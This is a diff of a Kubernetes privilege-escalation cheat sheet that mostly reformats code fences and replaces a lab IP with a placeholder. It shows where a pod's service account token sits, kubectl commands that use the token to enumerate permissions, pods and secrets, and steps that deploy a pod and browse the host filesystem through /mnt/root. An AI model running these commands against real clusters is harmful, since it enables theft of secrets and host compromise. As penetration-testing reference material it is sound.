@@ -4,12 +4,11 @@ date: 2024-7-22
 tags: ["Kubernetes", "container", "privesc"]
 ---
 
----
 ### Token Location
 
 <div>
 
-```bash
+```console
 /run/secrets/kubernetes.io/serviceaccount/token
 ```
 
@@ -19,7 +18,7 @@ tags: ["Kubernetes", "container", "privesc"]
 
 <div>
 
-```bash
+```console
 /run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
@@ -29,49 +28,49 @@ tags: ["Kubernetes", "container", "privesc"]
 
 <div>
 
-```bash
+```console
 # List all namespaces
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get namespaces
 ```
 
-```bash
+```console
 # Get user permissions in current namespace
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list
 ```
 
-```bash
+```console
 # Get user permissions in specific namespace
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n <NAMESPACE>
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list -n <NAMESPACE>
 ```
 
-```bash
+```console
 # List all pods
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods --all-namespaces
 ```
 
-```bash
+```console
 # List pods in specific namespace
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods -n <NAMESPACE>
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods -n <NAMESPACE>
 ```
 
-```bash
+```console
 # Get YAML of a pod
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pod <POD_NAME> -o yaml
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pod <POD_NAME> -o yaml
 ```
 
-```bash
+```console
 # Get info of a pod
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe pod <POD_NAME> -n <NAMESPACE>
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe pod <POD_NAME> -n <NAMESPACE>
 ```
 
-```bash
+```console
 # List secrets
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get secrets -n <NAMESPACE>
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get secrets -n <NAMESPACE>
 ```
 
-```bash
+```console
 # Get info of a secret
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe secret <secret_name> -n <NAMESPACE>
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe secret <SECRET_NAME> -n <NAMESPACE>
 ```
 
 </div>
@@ -88,7 +87,7 @@ kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11
 
 <div>
 
-```yml
+```console
 apiVersion: v1 
 kind: Pod
 metadata:
@@ -117,8 +116,8 @@ spec:
 
 <div>
 
-```bash
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 apply -f test.yaml
+```console
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> apply -f test.yaml
 ```
 
 </div>
@@ -127,11 +126,11 @@ kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11
 
 <div>
 
-```bash
-kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 exec test --stdin --tty -n <NAMESPACE>
+```console
+kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> exec test --stdin --tty -n <NAMESPACE>
 ```
 
-```bash
+```console
 # Check host filesystem
 cd /mnt/root/
 ```
